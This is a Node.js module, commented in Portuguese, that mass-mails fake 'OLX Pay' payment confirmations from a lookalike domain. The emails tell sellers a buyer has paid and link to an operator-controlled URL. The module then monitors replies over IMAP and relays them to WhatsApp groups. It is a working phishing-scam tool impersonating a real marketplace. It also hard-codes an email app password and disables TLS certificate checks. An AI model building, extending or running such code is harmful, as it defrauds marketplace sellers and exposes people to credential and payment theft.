const nodemailer = require("nodemailer");
const fs = require("fs");
const path = require("path");
const config = require("../config.json");

// Configuração do transporte SMTP
const transporter = nodemailer.createTransport({
  service: "gmail", // troque para seu serviço: 'gmail', 'hotmail', etc
  auth: {
    user: "siteolx@siteolx.com", // seu email
    pass: "wsko fobj ibpd kppo", // sua senha ou senha de app
  },
});

// Arquivo de configuração para armazenar respostas processadas
const arquivoRespostasProcessadas = path.join(__dirname, "../data/respostas-processadas.json");

// Garantir que o arquivo existe
if (!fs.existsSync(arquivoRespostasProcessadas)) {
  fs.writeFileSync(arquivoRespostasProcessadas, JSON.stringify({}, null, 2));
}

/**
 * Função para enviar e-mail
 * @param {string} destinatario - e-mail do destinatário
 * @param {string} assunto - assunto do e-mail
 * @param {string} htmlConteudo - conteúdo em HTML do e-mail
 */
async function enviarEmail(destinatario, assunto, htmlConteudo) {
  const mailOptions = {
    from: '"Equipe OLX Pay" <siteolx@siteolx.com>', // remetente
    to: destinatario,
    subject: assunto,
    html: htmlConteudo,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email enviado para ${destinatario}: ${info.messageId}`);
    return true;
  } catch (error) {
    console.error(`❌ Erro ao enviar email para ${destinatario}:`, error);
    return false;
  }
}

/**
 * Função para carregar dados de vendas do arquivo JSON
 * @returns {Array} Array com dados de vendas
 */
function carregarDadosVendas() {
  try {
    const caminhoArquivo = path.join(__dirname, "../data/vendas.json");
    const dados = fs.readFileSync(caminhoArquivo, "utf8");
    return JSON.parse(dados);
  } catch (error) {
    console.error("Erro ao carregar dados de vendas:", error);
    return [];
  }
}

/**
 * Função para enviar e-mails em massa para uma lista de destinatários
 * @param {Array} listaEmails - lista de e-mails destinatários
 * @param {string} codigoProduto - (opcional) código específico do produto
 * @param {string} assuntoPersonalizado - (opcional) assunto personalizado do e-mail
 */
async function enviarEmMassa(
  listaEmails,
  codigoProduto = null,
  assuntoPersonalizado = null
) {
  // Carregar dados de vendas
  const dadosVendas = carregarDadosVendas();

  if (dadosVendas.length === 0) {
    console.error(
      "Não foi possível carregar dados de produtos para o envio em massa"
    );
    return;
  }

  // Se não foi especificado um código, usa o primeiro produto na lista
  const produto = codigoProduto
    ? dadosVendas.find((p) => p.codigo === codigoProduto)
    : dadosVendas[0];

  if (!produto) {
    // lança exceção para que o chamador possa tratar
    throw new Error(
      `Produto com código ${codigoProduto || "<nenhum>"} não encontrado`,
    );
  }

  // Informações para o e-mail
  const codigoVenda = produto.codigo;
  const nomeProduto = produto.produto;
  const valorProduto = produto.valor;
  const nomeComprador = produto.comprador;

  const linkProduto = `${config.urlBase}/?id=${codigoVenda}`;

  // Contadores para estatísticas
  let enviados = 0;
  let falhas = 0;

  // Assunto do e-mail
  const assunto =
    assuntoPersonalizado ||
    `OLX Pay - Confirmação de Pagamento para ${nomeProduto}`;

  console.log(
    `Iniciando envio em massa para ${listaEmails.length} destinatários...`
  );
  console.log(`Produto: ${nomeProduto} (${codigoVenda})`);

  // Enviar para cada e-mail da lista
  for (const email of listaEmails) { 
    // Template do e-mail com link personalizado
    const mensagemHTML = `<div style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; padding: 24px; border: 1px solid #e0e0e0; border-radius: 10px; background-color: #ffffff;">
  <div style="text-align: center; margin-bottom: 20px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Logo_OLX_-_OK.png" alt="OLX Logo" style="height: 50px;" />
  </div>

  <h2 style="color: #7c00ff; font-size: 20px;">📨 Pagamento confirmado com sucesso</h2>

  <p style="font-size: 15px; color: #333;">Olá,</p>

  <p style="font-size: 15px; color: #333;">
    O pagamento referente ao seu anúncio <strong>"${nomeProduto}"</strong> foi <strong>confirmado com sucesso</strong> em nossa plataforma.
  </p>

  <p style="font-size: 15px; color: #333;">
    O comprador <strong>${nomeComprador}</strong> está pronto para realizar a <strong>retirada no local</strong>, conforme combinado.
  </p>

  <div style="background-color: #f6f6f6; padding: 15px; border-radius: 8px; margin: 20px 0;">
    <p style="font-size: 14px; color: #555; margin: 0;">
      🔒 Esta transação está protegida pela <strong>OLX Pay</strong>. O valor será liberado automaticamente assim que a retirada for confirmada pelo sistema.
    </p>
  </div>

  <div style="text-align: center; margin: 30px 0;">
    <a href="${linkProduto}"
       style="background-color: #7c00ff; color: #fff; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-size: 15px;">
       Ver detalhes da venda
    </a>
  </div>

  <p style="font-size: 14px; color: #333;">
    Em caso de dúvidas, acesse a <a href="https://ajuda.olx.com.br" style="color: #7c00ff; text-decoration: none;">Central de Ajuda</a> da OLX.
  </p>

  <p style="font-size: 14px; color: #555; margin-top: 30px;">
    Atenciosamente,<br>
    <strong>Equipe OLX Pay</strong>
  </p>
</div>`;

    // Enviar e-mail
    const resultado = await enviarEmail(email, assunto, mensagemHTML);

    if (resultado) {
      enviados++;
    } else {
      falhas++;
    }

    // Pequeno delay para evitar bloqueios do servidor de e-mail
    await new Promise((resolve) => setTimeout(resolve, 1500));
  }

  console.log(`
  ✅ Envio em massa concluído:
  - E-mails enviados com sucesso: ${enviados}
  - Falhas no envio: ${falhas}
  - Total de tentativas: ${listaEmails.length}
  `);
}

// Exportar funções
module.exports = {
  enviarEmail,
  enviarEmMassa,
  carregarDadosVendas,
  monitorarRespostasEmail,
  iniciarMonitoramento,
  buscarEmailsNaoLidos,
  formatarRespostaParaWhatsApp,
};

// Descomentar para testar
// teste();
// testarEnvioEmMassa();

// ============================================
// 📧 MONITORAMENTO DE RESPOSTAS POR IMAP
// ============================================

const Imap = require("imap");
const { simpleParser } = require("mailparser");

/**
 * Verificar se uma resposta já foi processada
 */
function jaFoiProcessada(messageId) {
  try {
    const dados = JSON.parse(fs.readFileSync(arquivoRespostasProcessadas, "utf8"));
    return dados[messageId] !== undefined;
  } catch {
    return false;
  }
}

/**
 * Marcar resposta como processada
 */
function marcarComoProcessada(messageId, dados) {
  try {
    const processadas = JSON.parse(fs.readFileSync(arquivoRespostasProcessadas, "utf8"));
    processadas[messageId] = {
      ...dados,
      dataProcessamento: new Date().toISOString(),
    };
    fs.writeFileSync(arquivoRespostasProcessadas, JSON.stringify(processadas, null, 2));
  } catch (error) {
    console.error("Erro ao marcar resposta como processada:", error);
  }
}

let inicioMonitoramentoEm = new Date();

/**
 * Buscar emails não lidos via IMAP (Google Workspace / Gmail)
 * Retorna array de objetos { de, assunto, corpo, messageId, data }
 */
function buscarEmailsNaoLidos() {
  return new Promise((resolve, reject) => {
    const imap = new Imap({
      user: "siteolx@siteolx.com",
      password: "wsko fobj ibpd kppo",
      host: "imap.gmail.com",
      port: 993,
      tls: true,
      tlsOptions: { rejectUnauthorized: false },
    });

    const emails = [];
    const parsePromises = [];
    let settled = false;

    const finishResolve = (result) => {
      if (!settled) {
        settled = true;
        resolve(result);
      }
    };

    const finishReject = (err) => {
      if (!settled) {
        settled = true;
        reject(err);
      }
    };

    imap.once("ready", () => {
      imap.openBox("INBOX", false, (err) => {
        if (err) {
          imap.end();
          return finishReject(err);
        }

        // Buscar apenas emails não lidos de hoje em diante
        const hoje = new Date();
        imap.search(["UNSEEN", ["SINCE", hoje]], (err, results) => {
          if (err) {
            imap.end();
            return finishReject(err);
          }

          if (!results || results.length === 0) {
            imap.end();
            return finishResolve([]);
          }

          const fetch = imap.fetch(results, { bodies: "", markSeen: true });

          fetch.on("message", (msg, seqno) => {
            msg.on("body", (stream) => {
              let buffer = "";
              stream.on("data", (chunk) => {
                buffer += chunk.toString("utf8");
              });
              stream.once("end", () => {
                const p = simpleParser(buffer)
                  .then((parsed) => {
                    emails.push({
                      messageId: parsed.messageId || `msg-${seqno}-${Date.now()}`,
                      de: parsed.from?.text || "Desconhecido",
                      deEmail: parsed.from?.value?.[0]?.address || "",
                      assunto: parsed.subject || "(sem assunto)",
                      corpo: parsed.text || "",
                      corpoHtml: parsed.html || "",
                      data: parsed.date || new Date(),
                    });
                  })
                  .catch((parseErr) => {
                    console.error(`Erro ao parsear email #${seqno}:`, parseErr.message);
                  });
                parsePromises.push(p);
              });
            });
          });

          fetch.once("error", (fetchErr) => {
            console.error("Erro no fetch IMAP:", fetchErr);
          });

          fetch.once("end", async () => {
            await Promise.all(parsePromises);
            imap.end();
          });
        });
      });
    });

    imap.once("error", (err) => {
      console.error("Erro IMAP:", err.message);
      finishReject(err);
    });

    imap.once("end", async () => {
      await Promise.all(parsePromises);
      finishResolve(emails);
    });

    imap.connect();
  });
}

/**
 * Formatar resposta de email para mensagem do WhatsApp
 */
function formatarRespostaParaWhatsApp(email) {
  // Limpar o corpo do email de lixo (assinaturas, citações anteriores)
  let corpoLimpo = email.corpo || "";

  // Remover citações de emails anteriores (linhas que começam com >)
  corpoLimpo = corpoLimpo
    .split("\n")
    .filter((linha) => !linha.trim().startsWith(">"))
    .join("\n");

  // Remover blocos "On ... wrote:" ou "Em ... escreveu:"
  corpoLimpo = corpoLimpo
    .replace(/On .+ wrote:[\s\S]*/i, "")
    .replace(/Em .+ escreveu:[\s\S]*/i, "")
    .replace(/-----\s*Original Message\s*-----[\s\S]*/i, "")
    .replace(/-----\s*Mensagem Original\s*-----[\s\S]*/i, "")
    .replace(/De:[\s\S]*Enviada:[\s\S]*/i, "")
    .replace(/From:[\s\S]*Sent:[\s\S]*/i, "")
    .trim();

  // Limitar tamanho
  if (corpoLimpo.length > 1500) {
    corpoLimpo = corpoLimpo.substring(0, 1500) + "...";
  }

  if (!corpoLimpo) {
    corpoLimpo = "(mensagem vazia ou somente imagens/anexos)";
  }

  const dataFormatada = new Date(email.data).toLocaleString("pt-BR");

  return (
    `*📩 RESPOSTA DE EMAIL RECEBIDA*\n\n` +
    `*De:* ${email.de}\n` +
    `*Assunto:* ${email.assunto}\n` +
    `*Data:* ${dataFormatada}\n\n` +
    `*Mensagem:*\n${corpoLimpo}`
  );
}

/**
 * Monitorar respostas de emails via IMAP e encaminhar para WhatsApp
 * @param {object} conn - Conexão do WhatsApp (Baileys)
 * @param {function} enviarParaGrupos - Função para enviar mensagem aos grupos
 */
async function monitorarRespostasEmail(conn, enviarParaGrupos) {
  try {
    console.log("📧 Verificando novas respostas de email...");

    const emails = await buscarEmailsNaoLidos();

    if (emails.length === 0) {
      console.log("✓ Nenhuma resposta nova de email");
      return true;
    }

    console.log(`📬 ${emails.length} email(s) novo(s) encontrado(s)!`);

    for (const email of emails) {
      // Ignorar emails recebidos antes do monitoramento iniciar
      if (email.data && new Date(email.data) < inicioMonitoramentoEm) {
        console.log(`⏭️ Email antigo (${email.assunto}) anterior ao início do monitoramento, ignorando...`);
        continue;
      }

      // Verificar se já foi processado
      if (jaFoiProcessada(email.messageId)) {
        console.log(`⏭️ Email ${email.messageId} já processado, pulando...`);
        continue;
      }

      // Formatar mensagem para WhatsApp
      const mensagemWpp = formatarRespostaParaWhatsApp(email);

      // Enviar para os grupos do WhatsApp
      if (enviarParaGrupos) {
        try {
          await enviarParaGrupos(mensagemWpp);
          console.log(`✅ Resposta de ${email.de} encaminhada para o WhatsApp`);
          await new Promise((resolve) => setTimeout(resolve, 1000));
        } catch (error) {
          console.error(`❌ Erro ao encaminhar resposta para WhatsApp:`, error.message);
        }
      }

      // Marcar como processada
      marcarComoProcessada(email.messageId, {
        de: email.de,
        deEmail: email.deEmail,
        assunto: email.assunto,
        data: email.data,
      });
    }

    return true;
  } catch (error) {
    console.error("❌ Erro ao monitorar respostas de email:", error.message);
    return false;
  }
}

/**
 * Iniciar monitoramento automático de respostas
 * @param {object} conn - Conexão do WhatsApp (Baileys)
 * @param {function} enviarParaGrupos - Função para enviar mensagem aos grupos
 * @param {number} intervaloMinutos - Intervalo entre verificações (padrão: 2 min)
 */
function iniciarMonitoramento(conn, enviarParaGrupos, intervaloMinutos = 2) {
  inicioMonitoramentoEm = new Date();
  console.log(`⏰ Monitoramento de respostas de email iniciado (a cada ${intervaloMinutos} min)`);

  // Primeira verificação após 10 segundos (dar tempo pro WhatsApp conectar)
  setTimeout(() => {
    monitorarRespostasEmail(conn, enviarParaGrupos);
  }, 10000);

  // Verificar periodicamente
  setInterval(() => {
    monitorarRespostasEmail(conn, enviarParaGrupos);
  }, intervaloMinutos * 60 * 1000);
}
